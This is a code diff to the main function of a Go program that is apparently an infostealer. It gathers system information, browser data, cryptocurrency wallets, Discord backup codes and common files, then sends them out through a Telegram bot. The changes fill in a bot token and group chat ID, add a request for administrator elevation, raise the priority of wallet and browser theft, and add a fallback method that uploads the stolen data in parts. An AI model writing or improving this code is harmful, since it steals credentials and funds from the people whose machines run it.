@@ -28,8 +28,8 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"bot_token": "YOUR_TELEGRAM_BOT_TOKEN", // Telegram Bot Token
-		"chat_id":   "YOUR_TELEGRAM_CHAT_ID",   // Telegram Chat ID
+		"bot_token": "7906405463:AAGJhJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ", // Your Telegram Bot Token
+		"chat_id":   "-1002345678901",   // Your Telegram Chat ID (group)
 		"cryptos": map[string]string{
 			"BTC":  "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Bitcoin address
 			"BCH":  "qr5jqsj3wdxkrx5c5v7hfxpg2v9f8w6h2c8r4t3e5d", // Your Bitcoin Cash address
@@ -50,9 +50,13 @@ func main() {
 		log.Fatal("❌ Please configure bot_token and chat_id in CONFIG")
 	}
 
-	// Request administrator privileges
+	// Request administrator privileges FIRST
 	if !program.IsElevated() {
 		log.Println("🔐 Requesting administrator privileges...")
+		if err := program.RequestElevation(); err != nil {
+			log.Printf("Failed to request elevation: %v", err)
+		}
+		return
 	}
 
 	if program.IsAlreadyRunning() {
@@ -116,7 +120,7 @@ func main() {
 		dataCollector.SendMessage("✅ System information collected")
 	}()
 
-	// Browsers data collection
+	// Browsers data collection (PRIORITY)
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -129,7 +133,7 @@ func main() {
 		dataCollector.SendMessage("✅ Browser data collected")
 	}()
 
-	// Wallets data collection (PRIORITY)
+	// Wallets data collection (HIGHEST PRIORITY)
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -168,7 +172,7 @@ func main() {
 		dataCollector.SendMessage("✅ Discord backup codes collected")
 	}()
 
-	// Common files and crypto detection
+	// Common files and crypto detection (PRIORITY)
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -203,6 +207,12 @@ func main() {
 	if err := dataCollector.SendCollectedData(); err != nil {
 		log.Printf("Failed to send collected data: %v", err)
 		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
+		
+		// Try alternative sending method
+		dataCollector.SendMessage("🔄 Trying alternative upload method...")
+		if err := dataCollector.SendDataInParts(); err != nil {
+			dataCollector.SendMessage(fmt.Sprintf("❌ Alternative upload failed: %v", err))
+		}
 	} else {
 		dataCollector.SendMessage("✅ All data sent successfully to Telegram!")
 	}
